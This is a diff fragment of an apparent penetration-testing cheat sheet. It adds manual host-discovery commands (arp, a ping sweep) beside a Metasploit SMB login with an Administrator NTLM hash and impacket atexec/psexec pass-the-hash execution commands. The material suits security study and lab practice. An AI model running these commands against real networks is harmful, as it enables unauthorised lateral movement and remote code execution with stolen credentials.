@@ -551,6 +551,10 @@ set RHOSTS 10.10.10.1-2
 set SMBUser Administrator
 set SMBPass be77c30f5bb90694f6fd9e48f380c9c3:6aa6bca0dafa60871fa5ecaf2217e05f
 run
+[*] Manual
+arp -a
+for /L %i in (1,1,254) do ping -n 1 192.168.1.%i
+
 [*] Pass The Hash
 impacket-atexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
 impacket-psexec -hashes '$HASH' '$USERNAME'@$TARGET "whoami /all"
